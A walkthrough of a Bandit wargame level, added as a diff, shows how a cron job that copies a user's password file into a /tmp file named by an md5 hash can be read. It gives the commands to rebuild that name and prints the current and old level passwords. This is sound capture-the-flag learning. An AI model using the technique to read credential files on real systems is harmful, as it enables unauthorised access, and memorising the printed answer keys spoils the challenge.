@@ -1,0 +1,25 @@
+I Run vim /etc/cron.d/cronjob_bandit23 to check the contents of the cronjob. that is:
+
+@reboot bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+* * * * * bandit23 /usr/bin/cronjob_bandit23.sh  &> /dev/null
+
+The contents of the /usr/bin/cronjob_bandit23.sh are:
+
+#!/bin/bash
+
+myname=$(whoami)
+mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
+
+cat /etc/bandit_pass/$myname > /tmp/$mytarget
+
+Given that the user who runs the script is bandit23, variable myname will have the value bandit23. So that script writes the contents (password) of file /etc/bandit_pass/bandit23 to a temporary file in /tmp directory whose name is the md5sum of the phrase : "I am user bandit23". 
+
+so if I just use these commands I will find the file in /tmp directory with the contents of /etc/bandit_pass/bandit23 
+
+I run echo "I am user bandit23" | md5sum | cut -d ' ' -f 1 and I get 8ca319486bfbbc3663ea0fbe81326349.
+
+I run cat /tmp/8ca319486bfbbc3663ea0fbe81326349 which gives me 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga.
+
+password for level 23: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga (old: QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G)
